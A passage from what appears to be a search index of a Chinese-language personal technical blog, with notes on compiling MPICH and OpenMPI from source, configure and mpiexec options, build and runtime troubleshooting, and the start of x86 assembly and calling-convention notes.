mpiexec\n/staff/fyyuan/miniconda3/bin/mpiexec\n</code></pre></p> <p>\u81ea\u5df1\u7f16\u8bd1\u7684 <pre><code>~/install/mpich-4.2.2/bin/mpiexec --version\nHYDRA build details:\n    Version:                                 4.2.2\n    Release Date:                            Wed Jul  3 09:16:22 AM CDT 2024\n    CC:                              gcc\n    Configure options:                       '--disable-option-checking' '--prefix=/staff/fyyuan/install/mpich-4.2.2' '--with-hwloc=embedded' 'CC=gcc' 'CXX=g++' '--disable-fortran' '--enable-fast=all,O3' '--cache-file=/dev/null' '--srcdir=../../../../mpich-4.2.2/src/pm/hydra' 'CFLAGS= -DNDEBUG -DNVALGRIND -O3' 'LDFLAGS=' 'LIBS=' 'CPPFLAGS= -DNETMOD_INLINE=__netmod_inline_ucx__ -I/staff/fyyuan/build/mpich-4.2.2-build/src/mpl/include -I/staff/fyyuan/build/mpich-4.2.2/src/mpl/include -I/staff/fyyuan/build/mpich-4.2.2/modules/json-c -I/staff/fyyuan/build/mpich-4.2.2-build/modules/json-c -I/staff/fyyuan/build/mpich-4.2.2/modules/hwloc/include -I/staff/fyyuan/build/mpich-4.2.2-build/modules/hwloc/include -D_REENTRANT -I/staff/fyyuan/build/mpich-4.2.2-build/src/mpi/romio/include -I/staff/fyyuan/build/mpich-4.2.2/src/pmi/include -I/staff/fyyuan/build/mpich-4.2.2-build/src/pmi/include -I/staff/fyyuan/build/mpich-4.2.2-build/modules/yaksa/src/frontend/include -I/staff/fyyuan/build/mpich-4.2.2/modules/yaksa/src/frontend/include'\n    Process Manager:                         pmi\n    Launchers available:                     ssh rsh fork slurm ll lsf sge manual persist\n    Topology libraries available:            hwloc\n    Resource management kernels available:   user slurm ll lsf sge pbs cobalt\n    Demux engines available:                 poll select\n</code></pre></p> <p>\u5b83\u7684 <pre><code>mpiexec --version\nHYDRA build details:\n    Version:                                 3.3.2\n    Release Date:                            Tue Nov 12 21:23:16 CST 2019\n    CC:                              x86_64-conda_cos6-linux-gnu-cc -I/staff/fyyuan/miniconda3/include -I/staff/fyyuan/miniconda3/include -L/staff/fyyuan/miniconda3/lib -Wl,-rpath,/staff/fyyuan/miniconda3/lib\n    CXX:                             x86_64-conda_cos6-linux-gnu-c++ -I/staff/fyyuan/miniconda3/include -I/staff/fyyuan/miniconda3/include -L/staff/fyyuan/miniconda3/lib -Wl,-rpath,/staff/fyyuan/miniconda3/lib\n    F77:                             x86_64-conda_cos6-linux-gnu-gfortran -I/staff/fyyuan/miniconda3/include -L/staff/fyyuan/miniconda3/lib -Wl,-rpath,/staff/fyyuan/miniconda3/lib\n    F90:                             x86_64-conda_cos6-linux-gnu-gfortran -I/staff/fyyuan/miniconda3/include -L/staff/fyyuan/miniconda3/lib -Wl,-rpath,/staff/fyyuan/miniconda3/lib\n    Configure options:                       '--disable-option-checking' '--prefix=/staff/fyyuan/miniconda3' '--disable-dependency-tracking' '--enable-cxx' '--enable-fortran' '--disable-wrapper-rpath' 'MPICHLIB_CFLAGS=-march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix' 'MPICHLIB_CPPFLAGS=-DNDEBUG -D_FORTIFY_SOURCE=2 -O2 -I/staff/fyyuan/miniconda3/include' 'MPICHLIB_CXXFLAGS=-fvisibility-inlines-hidden -std=c++17 -fmessage-length=0 -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix' 'MPICHLIB_FFLAGS=-fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix' 'MPICHLIB_FCFLAGS=-fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix' 'CC=x86_64-conda_cos6-linux-gnu-cc' 'CFLAGS=-I/staff/fyyuan/miniconda3/include -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix -O2' 'LDFLAGS=-L/staff/fyyuan/miniconda3/lib -Wl,-rpath,/staff/fyyuan/miniconda3/lib' 'CPPFLAGS=-I/staff/fyyuan/miniconda3/include -DNDEBUG -D_FORTIFY_SOURCE=2 -O2 -I/staff/fyyuan/miniconda3/include -I/tmp/build/80754af9/mpich-mpi_1575396103289/work/src/mpl/include -I/tmp/build/80754af9/mpich-mpi_1575396103289/work/src/mpl/include -I/tmp/build/80754af9/mpich-mpi_1575396103289/work/src/openpa/src -I/tmp/build/80754af9/mpich-mpi_1575396103289/work/src/openpa/src -D_REENTRANT -I/tmp/build/80754af9/mpich-mpi_1575396103289/work/src/mpi/romio/include' 'CPP=/staff/fyyuan/miniconda3/bin/x86_64-conda_cos6-linux-gnu-cpp' 'CXX=x86_64-conda_cos6-linux-gnu-c++' 'CXXFLAGS=-I/staff/fyyuan/miniconda3/include -fvisibility-inlines-hidden -std=c++17 -fmessage-length=0 -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix -O2' 'FC=x86_64-conda_cos6-linux-gnu-gfortran' 'FCFLAGS=-I/staff/fyyuan/miniconda3/include -fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix -O2' 'FFLAGS=-I/staff/fyyuan/miniconda3/include -fopenmp -march=nocona -mtune=haswell -ftree-vectorize -fPIC -fstack-protector-strong -fno-plt -O2 -ffunction-sections -pipe -I/staff/fyyuan/miniconda3/include -fdebug-prefix-map=/tmp/build/80754af9/mpich-mpi_1575396103289/work=/usr/local/src/conda/mpich-3.3.2 -fdebug-prefix-map=/staff/fyyuan/miniconda3=/usr/local/src/conda-prefix -O2' '--cache-file=/dev/null' '--srcdir=.' 'LIBS=' 'MPLLIBNAME=mpl'\n    Process Manager:                         pmi\n    Launchers available:                     ssh rsh fork slurm ll lsf sge manual persist\n    Topology libraries available:            hwloc\n    Resource management kernels available:   user slurm ll lsf sge pbs cobalt\n    Checkpointing libraries available:\n    Demux engines available:                 poll select\n</code></pre></p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpi","title":"MPI","text":"<p>mpi \u8fd0\u884c\u65f6\u9700\u8981\u4fdd\u8bc1\u7248\u672c\u4e00\u81f4\u3002\u800c apt \u5b89\u88c5\u7684 mpich \u53d7\u53d1\u884c\u7248\u7248\u672c\u5f71\u54cd\uff0c\u53ef\u80fd\u4e0d\u4e00\u6837\u3002\u56e0\u6b64\u6700\u597d\u7684\u65b9\u5f0f\u662f\u81ea\u5df1\u4ece\u6e90\u7801\u7f16\u8bd1 mpich\uff0c\u653e\u5728 NFS \u7b49\u516c\u5171\u53ef\u4ee5\u8bbf\u95ee\u7684\u5730\u65b9\u3002</p> <p>MPI \u7f16\u8bd1\u8f83\u5feb\uff08&lt;\u534a\u5c0f\u65f6\uff09\uff0c\u53ef\u4ee5\u7f16\u8bd1\u5f88\u591a\u7248\u672c\u4f7f\u7528</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpich-\u548c-openmpi-\u5bf9\u6bd4","title":"mpich \u548c openmpi \u5bf9\u6bd4","text":"<p>MPICH\uff1aGuides | MPICH</p> <ul> <li>\u652f\u6301 mpi2.0\uff0c\u529f\u80fd\u5f3a\u5927\uff0c\u6548\u7387\u9ad8</li> <li>\u7f3a\u70b9\u662f\u4ec5\u652f\u6301\u4ee5\u592a\u7f51</li> </ul> <p>OpenMPI\uff1a</p> <ul> <li>\u652f\u6301 mpi2.0</li> <li>\u5bf9\u4e8e CPU \u6838\u5fc3\u8f83\u591a\u7684\u8282\u70b9\uff0c\u63a8\u8350\u4f7f\u7528 openmpi</li> <li>\u652f\u6301\u5404\u79cd\u7f51\u7edc\uff0c\u5305\u62ec\u4ee5\u592a\u7f51\u548c infiniband</li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpich-\u7f16\u8bd1","title":"mpich \u7f16\u8bd1","text":"<p>p.s \u5207\u8bb0\u8981\u5728\u4f4e GLIBC \u7248\u672c\u7684\u673a\u5668\u4e0a\u7f16\u8bd1\uff0c\u56e0\u4e3a\u7f16\u8bd1\u51fa\u6765\u7684\u7ed3\u679c\u90fd\u4f1a\u52a8\u6001\u94fe\u63a5\u5230\u5f53\u524d\u5e73\u53f0\u7684 glibc \u5e93\uff08/lib/x86_64/libc.so\uff09\uff0c\u5982\u679c\u5e73\u53f0\u7248\u672c\u9ad8\uff08\u6bd4\u5982 ubuntu22.04 \u662f GLIBC 2.2.35\uff09\uff0c\u5728\u4f4e\u7248\u672c\u5e73\u53f0\u5c31\u65e0\u6cd5\u8fd0\u884c mpi \u7a0b\u5e8f</p> <p>\u5b98\u7f51\u6709\u8be6\u7ec6\u6587\u6863</p> <ul> <li>\u4ece\u6e90\u7801\u7f16\u8bd1\uff1aMPICH Installers\u2019 Guide\u00a0is a guide to help with the installation process of MPICH. Both Unix and Windows installation procedures are outlines.</li> <li>MPICH Users\u2019 Guide\u00a0provides instructions to use MPICH. This manual explains how to run MPI applications after MPICH is installed and working correctly.</li> </ul> <p>\u7f16\u8bd1\u547d\u4ee4</p> <ul> <li>\u9700\u8981\u5355\u72ec\u7684 build \u76ee\u5f55\uff0c\u548c src \u76ee\u5f55\u5206\u79bb</li> </ul> <pre><code>cd /path/to/build_tmp/\n\n/path/to/src/configure -prefix=/path/to/install 2&gt;&amp;1 | tee c.txt\n\nmake -j 2&gt;&amp;1 | tee m.txt   # debug \u53ef\u4ee5 VERBOSE=1\n\nmake install 2&gt;&amp;1 | tee mi.txt\n</code></pre> <p>\u914d\u7f6e\u540e\u7684\u4f8b\u5b50</p> <pre><code>../mpich-4.2.2/configure --prefix=$HOME/install/mpich-4.2.2 CC=gcc CXX=g++ --disable-fortran --enable-static --enable-fast=all,O3 2&gt;&amp;1 |tee tee c.log\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#configure-\u9009\u9879","title":"configure \u9009\u9879","text":"<ul> <li><code>--disable-fortran</code><ul> <li>\u6587\u6863\u91cc\u5199\u7684\u662f--disable-f77\uff1a\u7981\u7528 fortran 77\uff0c--disable-fc\uff1a\u7981\u7528 Fortran 90\uff08\u53ca\u4e4b\u540e 95, 2003, 2008 \u7248\u672c\uff09\u4f46\u662f\u5c1d\u8bd5\u540e\u65e0\u6548\uff0c\u4ecd\u7136\u4f1a\u8981\u6c42\u4f60\u6709 fortran \u7f16\u8bd1\u5668\u3002</li> </ul> </li> <li><code>--enable-fast</code>   MPICH libraries are built with default compiler optimization, -O2, which can be modified by --enable-fast configure option. For instance, --disable-fast disables the default optimization option. --enable-fast=O sets default compiler optimization as <code>-O&lt;n&gt;</code></li> <li><code>--enable-static</code>\uff1a\u662f\u5426\u4ea7\u751f <code>libmpi.a</code> \u7b49\u6587\u4ef6</li> <li><code>--enable-shared</code><ul> <li>mpicc \u7f16\u8bd1\u51fa\u6765\u7684\u7a0b\u5e8f\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u8fd0\u884c\u65f6\u9700\u8981\u8bbe\u7f6e<code>LD_LIBRARY_PATH</code>\u3002</li> <li>--disable-shared --enable-static \u5219\u4e0d\u7528\u8bbe\u7f6e<code>LD_LIBRARY_PATH</code></li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#enable-fast","title":"enable-fast","text":"<p>Both xFLAGS and MPICHLIB xFLAGS affect the compilation of the MPICH libraries. However, only xFLAGS is appended to MPI wrapper scripts, <code>mpicc</code> and friends.</p> <p>MPICH libraries are built with default compiler optimization, -O2, which can be modified by --enable-fast configure option. <code>--enable-fast=O&lt;n&gt;</code> sets default compiler optimization as -On</p> <pre><code>./configure --enable-fast=all,O3\n\n./configure --enable-fast=all MPICHLIB_CFLAGS=-O3 \\ \n            MPICHLIB_FFLAGS=-O3 \\ \n            MPICHLIB_CXXFLAGS=-O3 \\ \n            MPICHLIB_FCFLAGS=-O3\n</code></pre> <p>\u7b2c\u4e8c\u79cd\uff1aThis will cause the MPICH libraries to be built with -O3, and -O3 will not be included in the mpicc and other MPI wrapper script</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#process-manger","title":"Process Manger","text":"<ul> <li>--with-pm=hydra</li> </ul> <p>MPICH has been designed to work with multiple process managers; that is, although you can start MPICH jobs with mpiexec, there are different mechanisms by which your processes are started. An interface (called PMI) isolates the MPICH library code from the process manager. Currently three process managers are distributed with MPICH</p> <ul> <li>hydra: This is the default process manager that natively uses the existing daemons on the system such as ssh, slurm, pbs.</li> <li>gforker: This is a simple process manager that creates all processes on a single machine. It is useful both for debugging and for running on shared memory multiprocessors.</li> </ul> <p><code>\u2013with-pm</code> Select the process manager. The default is hydra; also useful are gforker and remshell. You can build with all three process managers by specifying <code>--with-pm=hydra:gforker:remshell</code></p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#mpiexec-\u9009\u9879","title":"mpiexec \u9009\u9879","text":"<pre><code>mpiexec -n 5 -f machinefile /path/to/build_tmp/examples/cpi\nmpiexec -n 5 -hosts icarus3,icarus4 /path/to/build_tmp/examples/cpi\n</code></pre> <pre><code>Usage: ./mpiexec [global opts] [local opts for exec1] [exec1] [exec1 args] : [local opts for exec2] [exec2] [exec2 args] : ...\n</code></pre> <ul> <li>\u53ef\u4ee5\u4e00\u6b21\u8fd0\u884c\u591a\u4e2a exec\uff0c\u53c2\u6570\u4f7f\u7528 <code>:</code> \u5206\u9694</li> <li>global opt \u5bf9\u6240\u6709 exec \u751f\u6548<ul> <li><code>-f {name}</code>:  file containing the host names</li> <li><code>-hosts {host list}</code>: comma separated host list</li> <li>Hydra specific options</li> </ul> </li> <li>local opt \u5bf9\u5355\u4e2a exec \u751f\u6548<ul> <li><code>-n/-np {value}</code>: number of processes</li> <li><code>{exec_name} {args}</code>: executable name and arguments</li> </ul> </li> </ul>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898_2","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#cluster-\u4e0a\u6267\u884c\u65f6\u4f7f\u7528\u4e86\u9519\u8bef\u7684-hydra_pmi_proxy","title":"cluster \u4e0a\u6267\u884c\u65f6\u4f7f\u7528\u4e86\u9519\u8bef\u7684 hydra_pmi_proxy","text":"<p>\u81ea\u5df1\u7f16\u8bd1\u7684 mpich \u5728 cluster \u4e0a\u6267\u884c\u65f6\u62a5\u9519\u3002</p> <pre><code>mpirun -f ~/app/machinefile.i3 -n 64 ~/build/mpich-build/examples/cpi\n\nzsh:1: no such file or directory: /usr/bin/hydra_pmi_proxy\n</code></pre> <p><code>-verbose</code> \u53ef\u4ee5\u5c55\u793a Hydra \u7684\u8be6\u7ec6\u4fe1\u606f\uff08mpiexec --help \u67e5\u770b\u66f4\u591a\uff09</p> <p>\u53ef\u4ee5\u770b\u5230\u6700\u540e\u6267\u884c\u7684\u547d\u4ee4\uff0c\u7531\u4e8e <code>/usr/bin/hydra_pmi_proxy</code> \u4e0d\u5b58\u5728\uff0c\u56e0\u6b64\u5c31\u62a5\u9519\u4e86\u3002</p> <pre><code>[mpiexec@icarus4] Launch arguments: /usr/bin/ssh -x icarus3 \"/usr/bin/hydra_pmi_proxy\" --control-port icarus4:45175 --debug --rmk user --launcher ssh --demux poll --pgid 0 --retries 10 --usize -2 --pmi-port 0 --gpus-per-proc -2 --proxy-id 0\nzsh:1: no such file or directory: /usr/bin/hydra_pmi_proxy\n</code></pre> <p>\u8c03\u7528<code>/usr/bin/hydra_pmi_proxy</code> \u800c\u4e0d\u662f\u81ea\u5df1\u7f16\u8bd1\u4ea7\u751f\u7684 hydra_pmi_proxy \u7684\u00b7\u539f\u56e0\u662f\uff0c\u6ca1\u6709\u6b63\u786e\u628a PATH \u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9 remote\u3002</p> <p>\u4f46\u662f\u6211\u5df2\u7ecf\u5728 zshrc \u4e2d\u8bbe\u7f6e\u4e86 PATH \u4f7f\u7528\u7f16\u8bd1\u7684 mpich\u3002\u53d1\u73b0\u539f\u6765\u662f\u5f53\u524d\u7684 shell \u6ca1\u6709 source bashrc/zshrc \u5bfc\u81f4\u7684\u3002source \u540e\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#ucx-version","title":"UCX version","text":"<p>configure: error: UCX installation does not meet minimum version requirement (v1.9.0). Please upgrade your installation, or use --with-ucx=embedded</p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#hydra","title":"hydra","text":"<p>make \u65f6\u62a5\u9519 <pre><code>make[4]: Entering directory '/staff/fyyuan/build/mpich-4.2.2-build/src/pm/hydra'\n  CCLD     mpiexec.hydra\n/usr/bin/ld: /staff/fyyuan/build/mpich-4.2.2-build/src/pm/hydra/.libs/libhydra.a(topo_hwloc.o): in function `hwloc_get_next_obj_by_type':\n/staff/fyyuan/build/mpich-4.2.2/modules/hwloc/include/hwloc/inlines.h:98: undefined reference to `hwloc_get_type_depth'\n</code></pre></p> <p>\u5bf9\u5e94\u7684 configure <pre><code>../mpich-4.2.2/configure --prefix=$HOME/install/mpich-4.2.2 CC=gcc CXX=g++ --disable-fortran --enable-fast=all,O3 2&gt;&amp;1 |tee tee c.log\n</code></pre></p>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#openmpi","title":"openmpi","text":"<ul> <li>4.7. configure command line options \u2014 Open MPI 5.0.x documentation (open-mpi.org)</li> </ul> <pre><code>../openmpi-4.1.4/configure --prefix=$HOME/ENV/openmpi-4.1.4 --disable-mpi-fortran CC=gcc CXX=g++\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u8fd0\u884c\u9009\u9879","title":"\u8fd0\u884c\u9009\u9879","text":"<pre><code>-v verbose\n-q quiet\n--use-hwthread-cpus  #\u4f7f\u7528\u7269\u7406\u6838\u4f5c\u4e3aslot\u6570\u76ee\n\n-H, -host, --host &lt;host1,host2,...,hostN&gt;\n-hostfile, --hostfile &lt;hostfile&gt;\n    % cat myhostfile\n    aa slots=2\n    bb slots=2\n    cc slots=2\n\n-c, -n, --n, -np &lt;#&gt;\n-cpus-per-proc, --cpus-per-proc &lt;#perproc&gt;\n-bind-to-core, --bind-to-core\n-bind-to-socket, --bind-to-socket\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#\u9047\u5230\u7684\u95ee\u9898_3","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/08/04/2022-08-04-gcc-mpi%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/#run","title":"run","text":"<pre><code>\u279c  workspace mpirun -n 4 ./mpi_hello\n--------------------------------------------------------------------------\nBy default, for Open MPI 4.0 and later, infiniband ports on a device\nare not used by default.  The intent is to use UCX for these devices.\nYou can override this policy by setting the btl_openib_allow_ib MCA parameter\nto true.\n\n  Local host:              snode0\n  Local adapter:           mlx5_0\n  Local port:              1\n\n--------------------------------------------------------------------------\n--------------------------------------------------------------------------\nWARNING: There was an error initializing an OpenFabrics device.\n\n  Local host:   snode0\n  Local device: mlx5_0\n--------------------------------------------------------------------------\nHello world from processor snode0, rank 3 out of 4 processors\nHello world from processor snode0, rank 0 out of 4 processors\nHello world from processor snode0, rank 1 out of 4 processors\nHello world from processor snode0, rank 2 out of 4 processors\n[snode0:2773927] 3 more processes have sent help message help-mpi-btl-openib.txt / ib port not selected\n[snode0:2773927] Set MCA parameter \"orte_base_help_aggregate\" to 0 to see all help / error messages\n[snode0:2773927] 3 more processes have sent help message help-mpi-btl-openib.txt / error in device init\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/","title":"x86 \u8bb0\u5f55","text":"<p>x86 \u8bb0\u5f55</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86-\u57fa\u7840","title":"x86 \u57fa\u7840","text":"<ul> <li>AT&amp;T \u6c47\u7f16\u683c\u5f0f\uff0c\u548c intel \u683c\u5f0f\u3002<ul> <li>\u7b80\u5355\u533a\u522b\uff1a<ul> <li>AT&amp;T \u4e2d\u6839\u636e\u64cd\u4f5c\u6570 size \u6dfb\u52a0\u4e0d\u540c suffix\uff0c\u5982\uff1ab, w, l, q</li> <li>AT&amp;T \u4e2d\u4f7f\u7528%\u8868\u793a\u5bc4\u5b58\u5668\uff0c$\u8868\u793a\u7acb\u5373\u6570\u3002</li> <li>\u6e90\u64cd\u4f5c\u6570\u548c\u76ee\u7684\u64cd\u4f5c\u6570\u987a\u5e8f\u76f8\u53cd\u3002AT&amp;T \u4e2d\u7b2c\u4e00\u4e2a\u662f\u6e90\u64cd\u4f5c\u6570\uff0c\u7b2c\u4e8c\u4e2a\u662f\u76ee\u7684\u64cd\u4f5c\u6570\u3002 \uff08\u7531\u4e8e x86 \u4e2d\uff0c\u76ee\u7684\u64cd\u4f5c\u6570\u53c8\u540c\u65f6\u4f5c\u4e3a\u6e90\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u8fd9\u79cd\u5199\u6cd5\u611f\u89c9\u602a\u602a\u7684\u3002\uff09</li> </ul> </li> </ul> </li> <li>\u5927\u591a\u6570\u7f16\u8bd1\u5668\u6df7\u5408\u4f7f\u7528 32 \u548c 64 \u4f4d\u6a21\u5f0f\uff0c32 \u4f4d\u5bc4\u5b58\u5668\u7528\u6765\u505a\u6574\u6570\u8ba1\u7b97\uff0c\u800c 64 \u4f4d\u7528\u4e8e\u4fdd\u5b58\u5185\u5b58\u5730\u5740\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5bc4\u5b58\u5668","title":"\u5bc4\u5b58\u5668","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5e38\u89c1\u6307\u4ee4","title":"\u5e38\u89c1\u6307\u4ee4","text":"<p>\u611f\u89c9\u6bd4\u8f83\u91cd\u8981\u7684\u6307\u4ee4\u7c7b\u522b</p> <ul> <li>\u6570\u636e\u79fb\u52a8\uff1amov</li> <li>\u57fa\u672c\u8ba1\u7b97\u6307\u4ee4\uff1aadd, sub, imul, idiv</li> <li>\u5206\u652f\u8df3\u8f6c\uff1acmp\uff0cjxx, jmp</li> </ul> <p>\u5bfb\u5740\u6a21\u5f0f</p> <ul> <li>\u7acb\u5373\u6570</li> <li>\u5bc4\u5b58\u5668</li> <li>\u5185\u5b58\u5730\u5740<ul> <li>indirect</li> <li>base-relative</li> <li>offset-scaled-base-relative</li> </ul> </li> </ul> <pre><code>movq (%rsi), %rax\nmovq    offset(%rsi), %rax\nmovq offset(%rbx, %rcx, scale), %rax\n</code></pre> <p>RISC \u67b6\u6784\u4e2d\u4e00\u822c\u91c7\u7528 load/store \u6a21\u5f0f\u5bf9\u5185\u5b58\u8fdb\u884c\u8bfb\u5199\uff0c\u5176\u5b83\u6307\u4ee4\u65e0\u6cd5\u8bfb\u5199\u5185\u5b58</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u51fd\u6570\u8c03\u7528","title":"\u51fd\u6570\u8c03\u7528","text":"<p>\u76f8\u5173\u6307\u4ee4</p> <ul> <li>call, ret</li> <li>enter, leave</li> </ul> <p>cheetsheet\uff1aHandout-CallReturn.graffle (wisc.edu)</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#abi","title":"ABI","text":"<p>\u9700\u8981\u77e5\u9053\u8c03\u7528\u7ea6\u5b9a\uff08calling convention\uff09\uff0c\u4e5f\u4e3a ABI\uff08\u5e94\u7528\u4e8c\u8fdb\u5236\u63a5\u53e3\uff09x86 calling conventions - Wikipedia</p> <ul> <li>\u5f71\u54cd\u51fd\u6570\u53c2\u6570\u662f\u5982\u4f55\u4f20\u9012\u7684\uff1a\u901a\u8fc7\u6808\u6216\u5bc4\u5b58\u5668</li> </ul> <p>caller rules:</p> <ul> <li>\u4fdd\u5b58 caller save \u5bc4\u5b58\u5668 (if use)\uff1a%rax, %rcx, %rdx</li> <li>\u6574\u6570\u53c2\u6570 (\u5305\u542b\u6307\u9488\uff09\u4f9d\u6b21\u653e\u5728%rdi, %rsi, %rdx, %rcx, %r8, \u548c %r9 \u5bc4\u5b58\u5668\u4e2d\u3002</li> <li>\u6d6e\u70b9\u53c2\u6570\u4f9d\u6b21\u653e\u5728\u5bc4\u5b58\u5668%xmm0-%xmm7 \u4e2d\u3002</li> <li>\u5bc4\u5b58\u5668\u4e0d\u591f\u7528\u65f6\uff0c\u53c2\u6570\u653e\u5230\u6808\u4e2d\u3002\u5c06\u51fd\u6570\u7684\u53c2\u6570\u4ee5\u76f8\u53cd\u7684\u987a\u5e8f\u63a8\u9001\u5230\u5806\u6808\u3002</li> <li>\u53ef\u53d8\u53c2\u6570\u51fd\u6570 (\u6bd4\u5982 printf), \u5bc4\u5b58\u5668%eax 